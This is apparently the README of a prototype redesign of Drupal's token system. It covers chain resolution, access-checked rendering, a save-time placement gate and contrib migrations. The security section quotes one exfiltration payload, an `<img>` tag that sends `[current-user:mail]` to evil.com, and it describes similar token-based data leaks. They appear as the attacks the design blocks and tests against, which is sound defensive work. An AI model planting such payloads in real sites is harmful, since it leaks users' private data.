# Drupal token system redesign

A prototype redesign of Drupal's token system, built inside Drupal core
alongside the existing one. It keeps the familiar `[node:title]` syntax and every
legacy `hook_tokens()` implementation working, while replacing the engine
underneath with something structural, efficient, and access-aware.

This repository is a showcase of that *idea*: a new engine, a typed-data
discovery layer, a security model with access enforcement, and migrations
of three contrib modules as validation.

You can clone this and run it using [DDEV](https://ddev.com/get-started/).

This is just a proof of concept, it's not ready for thorough review of the code,
interrogate the ideas instead 🙏

## What we are trying to do

The current token system splits the world into **types** (`node`) and **tokens**
(`title`). That distinction confuses even experienced developers, and because
traversal is hand-rolled inside every hook_tokens() there's no chain of ownership
and no viewer is threaded through to check access against. Correct access
enforcement is either impossible or barely so in most circumstances.

The redesign collapses the split. **Every colon-delimited segment is a token**
with a declared input type, output type, and optional arguments:

```
[node:field_author:entity:field_established:custom:Y-m-d]
```

Each segment declares what it consumes and what it produces. Chaining becomes
structural: the output type of one segment must match the input type of the
next, and the engine walks the chain once, in one place, instead of every
provider re-implementing traversal. A token's identity is the pair
`(input_type, name)`, never a bare name, which is what makes collisions and
routing well-defined.

## Architecture

Four layers, kept deliberately separate:

1. **Declaration** - attributed PHP classes. A resolver carries a `#[Token]`
   attribute declaring its `(input_type, name, output_type)` contract and lives
   in the module's `Plugin\Token` namespace. A plugin manager discovers it
   statically from the attribute (no service registration), caches the
   definitions, and instantiates the resolver lazily only when one of its
   tokens is resolved. A reusable `PathToken` base covers the pure
   typed-data-path case with no class body.
2. **Discovery** - a registry that builds **per-input-type slices on demand** and
   caches them independently. A type's list stacks three sources: tokens declared by #[Token] classes, field tokens read automatically from an entity's fields, and an event to adjust the whole list at once (today's hook_token_info_alter). The full set is never built up front.

3. **Resolution** - the engine converts a chain plus a data context into a
   structured `TokenResult` carrying the value, cacheability, and an access
   result. Cacheability and access combine automatically as the chain is
   walked; providers only declare their own contribution.
4. **Rendering** - format-aware serialization, separate from resolution. A
   resolved value is serialized differently for a set of output contexts
   (currently HTML, plain text, URL slug, email subject), with a default leaf
   serialization per output type.

## Security model

### Resolution

Resolution is access-checked against the viewer - the account that will see the
output (e.g. the recipient of a queued email). Enforcement is **tiered**, keyed
on whether the caller identifies that account: pass `viewer` (or a full
`token_actor`) and every check below runs; pass neither and resolution runs in
an unenforced tier that reproduces legacy output exactly, plus a deprecation
notice. An earlier iteration silently defaulted the viewer to the request's
current user and always enforced - which was itself a live behaviour break for
viewer-less callers (cron mail, drush, pathauto ran as anonymous and got empty
strings where legacy returned values). That default is gone; the engine no
longer depends on the current user at all, and the BC test pins viewer-less
output byte-for-byte against the legacy bridge
([`TokenTieredEnforcementTest`](core/modules/system/tests/src/Kernel/Token/TokenTieredEnforcementTest.php)).

In the enforced tier, when the access check fails the token renders empty and
is never handed to the legacy hooks as a fallback (which would have produced
the value with no access check).
The check is layered: root entity view access, traversed-to entities at
each `entity` deref, and field-level access on every read - the check token
systems classically omit (entity access does not imply field access), which is
how fields like `user.mail` leak. Each has a test that flips one permission,
with a negative control showing the leak when the guard is removed.

Modules that post-process replacements have a successor to
`hook_tokens_alter()` for engine-resolved tokens:
[`TokenResultAlterEvent`](core/lib/Drupal/Core/Token/Event/TokenResultAlterEvent.php)
fires once per engine-resolved token after the chain's result is fully
composed but before the access gate and cacheability bubbling, so a
subscriber's replacement result has its access enforced and its cacheability
bubbled exactly like a resolver's own. The asymmetry is deliberate and worth
stating plainly: legacy-path tokens do not fire this event - they keep flowing
through `hook_tokens_alter()` as they always have - so a module altering both
kinds implements both until its tokens finish migrating.

Rendering then decides how a value is emitted safely, per output context: HTML
escapes it (no markup injection, no double-encode); email subject collapses
CR/LF to one line (no header injection); URL slug transliterates and normalises
to `[a-z0-9-]`. Locale-sensitive paths (slug transliteration, timestamp dates)
follow the `langcode` option - which pathauto already sets per translation -
falling back to content language, so "Zürich" slugs to `zuerich` under German
rules rather than the ambient interface language. Tested in
[`TokenRendererTest`](core/tests/Drupal/Tests/Core/Token/TokenRendererTest.php).

### Placement

Placement is the authoring-side counterpart: "may this author put this token
here?", checked at save time against the author, not the viewer. The two are
independent, and placement is the layer that stops the attack resolution cannot.
An unprivileged author drops `[node:uid:entity:mail]` into reusable content; a
privileged user later views a page it renders on, the mail field-access check
passes for that viewer, and the value is exfiltrated through them (e.g. via an
`<img>` URL). The viewer was entitled to see it; the author was never entitled
to place a token that reads it.

The [`TokenPlacement`](core/lib/Drupal/Core/Token/Plugin/Validation/Constraint/TokenPlacementConstraintValidator.php)
constraint walks each token's chain against the definitions (no entity is
loaded) and blocks a save when any step exposes data the author cannot access: a
field token whose field they cannot view (field access checked against the
author with no entity, so it answers permission-coarsely - `user.mail` needs
`administer users`), or an attributed token declaring a
[`place_permission`](core/lib/Drupal/Core/Token/Attribute/Token.php) they lack.
The walker mirrors the engine's traversal rules - including implicit delta-0
coercion on multi-value fields and the identity-zero segment - so the gate
assesses the same chain the engine would resolve. That parity was an
under-gating gap found by adversarial review (spellings like
`[node:field_refs:entity:name]` walked one way by the engine and another by
the validator) and is now pinned by
[`TokenPlacementTraversalParityTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementTraversalParityTest.php).
Gating is on presence, not on what changed, so editing content that already
holds a restricted token challenges an author who is not entitled to it. A
system-module `hook_entity_bundle_field_info_alter()` auto-attaches the
constraint to every string and text field, and it fires on form/API submission
(the untrusted path), leaving trusted programmatic writes alone.

The `system.token` `harden_placement` flag governs exactly one class of chain:
those that cannot be statically walked to their leaf (a polymorphic
reference). Those "unverifiable" chains are blocked only when hardening is on
and the author lacks the `place unverifiable tokens` permission. Chains the
walker CAN verify, and which reach data the author cannot access, block at
save regardless of the flag - that is the security fix itself and is
intentional, not governed by any opt-out. On upgrade,
`system_update_12002()` gives existing sites `harden_placement: false` so
unverifiable chains keep saving as they always did; new installs get `true`.
Tested, with the privileged-viewer chain attack and a hardening/override pair,
in
[`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php)
and
[`TokenHardenPlacementUpdateTest`](core/modules/system/tests/src/Kernel/Token/TokenHardenPlacementUpdateTest.php).

### Reported issues this maps to

The open core and contrib security issues split across the two layers. Each is
reproduced with core entities or fixtures (the named contrib modules are not in
this repo, so their use-cases are reproduced via the same underlying mechanism):

| Issue | Vector | Layer | Test |
|---|---|---|---|
| [core #3489852](https://www.drupal.org/project/drupal/issues/3489852) | "Token replace system has no access checking" (the umbrella) | both | the suites below |
| [token #3593501](https://www.drupal.org/project/token/issues/3593501) | field value chained through an entity reference leaks a restricted entity (`[node:field:entity:field:value]`) | resolution / viewer | [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php) (`testFieldLevelAccessIsEnforcedNotJustEntityAccess`) |
| [redirect #3591834](https://www.drupal.org/project/redirect/issues/3591834) | a token discloses a field of an entity the user cannot access | resolution / viewer | [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php) (`testRootEntityViewAccessIsEnforced`) |
| [token_filter #3587719](https://www.drupal.org/project/token_filter/issues/3587719) | author embeds `[…:mail]` in markup; exfiltrated when a privileged user views it | placement / author | [`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php) (`testChainToRestrictedFieldIsGatedByFieldAccess`) |
| [metatag #3587720](https://www.drupal.org/project/metatag/issues/3587720) | same, in metatag fields | placement / author | [`TokenPlacementConstraintTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementConstraintTest.php) |
| [drupal #3587726](https://www.drupal.org/project/drupal/issues/3587726) | sensitive tokens placeable by low-privilege authors | placement / author | [`TokenPlacementCurrentUserTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementCurrentUserTest.php) (exact `[current-user:mail]` repro) |

The placement issues are the case resolution-access alone cannot close: the
viewer is entitled to the value, so only stopping the author from placing the
token prevents the leak.

The literal token in those three issues, `[current-user:mail]`, is now covered
directly: `current-user` is declared as a root token (a `#[Token]` with an
empty input type, resolving to the acting account's user entity), which makes
the chain walkable by the placement gate straight into `entity:user` field
access. The exact attack from #3587726 - an author without access to the mail
field saving `<img src="http://evil.com/?u=[current-user:mail]">` in body
text - is reproduced and blocked in
[`TokenPlacementCurrentUserTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementCurrentUserTest.php),
with a permitted author passing. Token-type names that differ from their
entity type (`term` vs `taxonomy_term`) walk through the same gate via the
entity-type mapper. Resolution-side, `current-user` resolves through the
engine only in the enforced tier; viewer-less callers keep byte-identical
legacy output.

## Backward compatibility

This is not a parallel system behind a flag. The new engine is a superset of the old one: the legacy hook system still works, bridged into the engine rather than replaced.

- Token syntax is unchanged.
- `hook_token_info()` and `hook_tokens()` keep working, untouched. A token stays  on the legacy hooks until it is *deliberately* moved over (someone declares a
  resolver for it, or removes the legacy hook). The new engine only takes a token
  when there's an explicit resolver for it, or when it's a field the legacy hooks
  never exposed. Auto-discovered fields never shadow a token a hook already
  defines, so nothing legacy is silently overridden.
- The legacy hooks stay the source of truth for their tokens until they are
  migrated or removed. Migration is mechanical and incremental, per token, not a
  big-bang rewrite.
- When two `#[Token]` classes do claim the same identity, the collision is no
  longer silent: the winner is deterministic (module order - higher weight,
  ties to the alphabetically last name, the same intuition as `hook_alter()`
  ordering), the loser is logged as a warning naming both classes, and
  `TokenResolverManager::getIdentityConflicts()` exposes the full list for a
  status report. Pinned across both install orders in
  [`TokenIdentityConflictTest`](core/modules/system/tests/src/Kernel/Token/TokenIdentityConflictTest.php).
- The seam where legacy-hook replacements and engine replacements meet in one
  string is test-proven, not assumed: six scenarios (HTML and plain-text
  contexts, legacy values returning `Markup`, `#markup` render round-trip,
  no-separator splices, the `callback` option) assert each provenance is
  escaped exactly once, with `Html::escape()` as an independent oracle - see
  [`TokenMixedProvenanceEscapingTest`](core/modules/system/tests/src/Kernel/Token/TokenMixedProvenanceEscapingTest.php).

## Performance

The registry builds and caches token definitions as per-input-type slices, on
demand. Resolving a chain only builds the slices for the types it walks; the
full token set is never assembled up front, and token replacement
never triggers the heavier `hook_token_info()` build.

This is a structural property rather than a wall-clock benchmark, so it has a
deterministic test instead: after resolving a single chain, only the traversed
types' slices exist in the cache, while an installed-but-untraversed entity
type's slice is absent. See
[`TokenRegistryLazyLoadingTest`](core/modules/system/tests/src/Kernel/Token/TokenRegistryLazyLoadingTest.php).

There are wall-clock numbers now too, from a reproducible harness
([`TokenReplacementBenchmark`](core/modules/system/tests/src/Kernel/Token/TokenReplacementBenchmark.php),
1000 iterations). Full results and methodology are in
[BENCHMARKS.md](BENCHMARKS.md). The honest summary:

- Batch replacement (`Token::replaceMultiple()` with a shared chain-prefix
  memo) is ≈1.7× faster than per-string replacement on a metatag-shaped
  workload - 25 short strings with heavily shared chain prefixes, the exact
  case raised in the design discussion.
- Access enforcement is where the engine's cost lives: on 4-token multi-segment
  chains resolved directly by the engine, enforcement accounts for ≈72% of the
  cost (~182µs of ~252µs/op); the structural chain walk itself is ~70µs/op and
  stable. On realistic mixed workloads (legacy + engine tokens together),
  enforcement roughly doubles end-to-end `Token::replace()` time. "Merging
  access results is surprisingly expensive" was predicted in the design
  discussion; these numbers quantify it and make it optimizable.
- One cost regression was found and fixed: contrib token's internal
  `generate()` calls carry no viewer, so the new deprecation fired on every
  legacy field-token resolution (~+24µs/op). The engine now fires it once per
  instance (once per request), returning the legacy path to its baseline
  (10.3µs/op re-measured) while CI and kernel tests still observe the notice.
  Threading the viewer through contrib token remains the long-term fix (see
  Open questions).

## Challenges

Many challenging cases have been discussed, I have tried to cover as many of them as
I could here with tests:

- Structural multi-segment chains via output-to-input matching -
  [`TokenChainResolutionEngineTest`](core/modules/system/tests/src/Kernel/Token/TokenChainResolutionEngineTest.php).
- Computed traversal (`comment:entity`-style) carrying composed data forward -
  [`TokenContextComputedTraversalTest`](core/modules/system/tests/src/Kernel/Token/TokenContextComputedTraversalTest.php).
- Entity-reference field chains via typed-data discovery, e.g.
  `[node:uid:entity:name]` -
  [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php).
- Delta-indexed list tokens (a numeric segment as a built-in index operation) -
  [`TokenEngineHardCasesTest`](core/modules/system/tests/src/Kernel/Token/TokenEngineHardCasesTest.php)
  (engine-level) and
  [`ListDeltaResolverTest`](core/modules/system/tests/src/Kernel/Token/ListDeltaResolverTest.php),
  composing with reference traversal on multi-value fields (e.g.
  `[node:field_refs:1:entity:name]`) in
  [`TokenMultiValueReferenceDeltaTest`](core/modules/system/tests/src/Kernel/Token/TokenMultiValueReferenceDeltaTest.php).
- Type-level image-style operations -
  [`TokenEngineHardCasesTest`](core/modules/system/tests/src/Kernel/Token/TokenEngineHardCasesTest.php)
  (engine-level) and
  [`ImageStyleTokenTest`](core/modules/system/tests/src/Kernel/Token/ImageStyleTokenTest.php).
- `fieldTokenInfoAlter` equivalence via discovery plus the alter event -
  [`TokenTypedDataDiscoveryTest`](core/modules/system/tests/src/Kernel/Token/TokenTypedDataDiscoveryTest.php)
  and
  [`TokenDiscoveryAlterEventTest`](core/modules/system/tests/src/Kernel/Token/TokenDiscoveryAlterEventTest.php).
- Actor-model access enforcement at the root, traversed, and field levels -
  [`TokenEntityFieldChainTest`](core/modules/system/tests/src/Kernel/Token/TokenEntityFieldChainTest.php).
- Tiered enforcement: viewer-less callers get byte-identical legacy output
  (pinned against the legacy bridge) while enforced callers get the full
  access model, including `token_actor` equivalence and the
  anonymous-viewer edge -
  [`TokenTieredEnforcementTest`](core/modules/system/tests/src/Kernel/Token/TokenTieredEnforcementTest.php).
- Post-resolution alteration with composed access and cacheability -
  [`TokenResultAlterEventTest`](core/modules/system/tests/src/Kernel/Token/TokenResultAlterEventTest.php).
- Escaping at the legacy/engine seam, each provenance escaped exactly once -
  [`TokenMixedProvenanceEscapingTest`](core/modules/system/tests/src/Kernel/Token/TokenMixedProvenanceEscapingTest.php).
- Placement-walker parity with the engine's traversal rules -
  [`TokenPlacementTraversalParityTest`](core/modules/system/tests/src/Kernel/Token/TokenPlacementTraversalParityTest.php).

There are almost certainly other use-cases we need to solve for, this is a
work in progress.

## Open questions

- There's a hard cap on how deep a token chain can go (10 for now). I just picked
  a number, it should probably be a configurable per-site setting instead.

- Making field tokens precise per content type would mean the input type carries
  the content type (think `entity:node:article`). The snag is references: once
  you follow one you don't know the target's content type until you load it, so
  types stop being something you can work out up front. And it's mostly a nicety
  anyway, resolving an absent field already just comes back empty, so I'm not
  convinced it's worth the complexity.

- The placement gate (see Security model) is permission-coarse by necessity: at
  save time no entity is bound, so it checks the leaf field's access against the
  author with a null entity rather than a concrete record. It has known edges
  that need scrutiny: only base fields on a chained-to entity type are
  field-access checked, not configurable ones; it covers entity text fields
  only, not config text (mail templates) or programmatic `Token::replace()`;
  and presence-gating means a low-privilege editor re-saving grandfathered
  content can be challenged for a token they did not add - including, now that
  the gate walks `current-user` chains, content that predates the gate
  entirely. `harden_placement` deliberately does not soften that (it governs
  only unverifiable chains), so how much friction is acceptable, and whether a
  complementary render-time format filter should back the gate for defence in
  depth, is something we need to decide.

- The no-viewer deprecation now fires once per engine instance (once per
  request) rather than per call: contrib token's field-token internals make
  viewer-less calls on every legacy field-token resolution, and per-call
  firing cost ~+24µs/op and a noisy log. Threading the viewer through contrib
  token's helpers is still the right long-term fix (and what any heavy token
  consumer will want to do anyway); a status-page report of observed
  viewer-less callers is a possible follow-up. Input welcome.

- Contrib token's `fieldTokenInfoAlter()` is reproduced on the discovery alter
  event ("phase 1"), but the trickier dynamic cases aren't all proven, and the
  legacy hook is still in place. Phase 2 - actually removing the legacy path in
  contrib token - hasn't been attempted.

## Where the code lives

- Engine and value objects:
  [`core/lib/Drupal/Core/Token/`](core/lib/Drupal/Core/Token/). Key pieces: the
  [resolution engine](core/lib/Drupal/Core/Token/TokenResolutionEngine.php), the
  lazy [registry](core/lib/Drupal/Core/Token/TokenRegistry.php),
  [typed-data field discovery](core/lib/Drupal/Core/Token/Discovery/TypedDataFieldDiscovery.php),
  the [`#[Token]` attribute](core/lib/Drupal/Core/Token/Attribute/Token.php),
  the [locale-aware renderer](core/lib/Drupal/Core/Token/TokenRenderer.php), the
  [result alter event](core/lib/Drupal/Core/Token/Event/TokenResultAlterEvent.php),
  and identity-conflict detection in the
  [resolver manager](core/lib/Drupal/Core/Token/TokenResolverManager.php).
- Placement gate: the
  [`TokenPlacement` constraint + validator](core/lib/Drupal/Core/Token/Plugin/Validation/Constraint/)
  that walks a token's chain and checks field access against the author, the
  [`place_permission`](core/lib/Drupal/Core/Token/Attribute/Token.php) a declared
  token can carry, and the auto-attach hook in
  [`SystemHooks::entityBundleFieldInfoAlter()`](core/modules/system/src/Hook/SystemHooks.php).
- Tests: [kernel tests](core/modules/system/tests/src/Kernel/Token/) and
  [unit tests](core/tests/Drupal/Tests/Core/Token/).
- Contrib validation migrations: see [Contrib migrations](#contrib-migrations).

## Contrib migrations

Three contrib modules were migrated as canaries. In each, one token was
moved from its legacy `hook_tokens()` implementation to a `#[Token]` attributed
resolver in the module's `Plugin\Token` namespace - discovered from the
attribute, no service registration. The legacy hook is retained
in every case, so the token keeps working on Drupal versions without the engine;
on the new engine the attributed resolver takes precedence and produces identical
output. Each migration ships a four-part test: the resolver in isolation,
engine routing to that resolver, end-to-end replacement, and parity with the
retained legacy hook.

These modules are pinned clones and are not fully compatible with core's current
`main` branch (12.0-dev): their broader test suites carry unrelated Drupal 12
incompatibilities, so running a module's whole suite against this core surfaces
failures that are theirs, not the engine's. The migration-proof and
backward-compatibility tests linked below are the relevant evidence and do run
green against this core; run them directly with the commands under Running the
tests rather than the full module suites.

### pathauto

Migrates `[array:join-path]` (each array value cleaned by Pathauto's alias
cleaner, then joined with `/`) to
[`ArrayJoinPathToken`](modules/contrib/pathauto/src/Plugin/Token/ArrayJoinPathToken.php).
Tested by
[`ArrayJoinPathTokenMigrationProofTest`](modules/contrib/pathauto/tests/src/Kernel/ArrayJoinPathTokenMigrationProofTest.php)
and
[`TokenEngineBackwardCompatibilityTest`](modules/contrib/pathauto/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php).

### ECA

Migrates `[node:entity_type]` (the entity type id) to
[`NodeEntityTypeToken`](modules/contrib/eca/src/Plugin/Token/NodeEntityTypeToken.php). ECA
adds an `entity_type` token to every content entity type via
`hook_token_info_alter()`; because a resolver is identified by a single
`(input_type, name)` pair, the migration is scoped to the `node` type and the
legacy hook still serves the others. Tested by
[`NodeEntityTypeTokenMigrationProofTest`](modules/contrib/eca/tests/src/Kernel/NodeEntityTypeTokenMigrationProofTest.php)
and
[`TokenEngineBackwardCompatibilityTest`](modules/contrib/eca/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php).

### webform

Migrates `[webform:id]` (the webform machine id) to
[`WebformIdToken`](modules/contrib/webform/src/Plugin/Token/WebformIdToken.php).
Tested by
[`WebformIdTokenMigrationProofTest`](modules/contrib/webform/tests/src/Kernel/WebformIdTokenMigrationProofTest.php)
and
[`TokenEngineBackwardCompatibilityTest`](modules/contrib/webform/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php).

## Running the tests

```bash
# The whole token surface (engine, discovery, rendering, access, placement).
ddev exec "php vendor/bin/phpunit -c core core/modules/system/tests/src/Kernel/Token/ core/tests/Drupal/Tests/Core/Token/"

# Contrib migration + backward-compatibility tests, per module. Run these
# specific files, not the modules' full suites: the modules are not fully
# compatible with core main, so their wider suites fail on unrelated D12 issues.
ddev exec "php vendor/bin/phpunit -c core \
  modules/contrib/pathauto/tests/src/Kernel/ArrayJoinPathTokenMigrationProofTest.php \
  modules/contrib/pathauto/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php"

ddev exec "php vendor/bin/phpunit -c core \
  modules/contrib/eca/tests/src/Kernel/NodeEntityTypeTokenMigrationProofTest.php \
  modules/contrib/eca/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php"

ddev exec "php vendor/bin/phpunit -c core \
  modules/contrib/webform/tests/src/Kernel/WebformIdTokenMigrationProofTest.php \
  modules/contrib/webform/tests/src/Kernel/TokenEngineBackwardCompatibilityTest.php"
```

## Status

While this took a lot of time and effort to put together (obviously AI-assisted), it is by
no means a solved case.
The whole architecture can be thrown out if it's not fit for purpose, please don't hold back.

Join the #token channel on Drupal Slack to discuss.
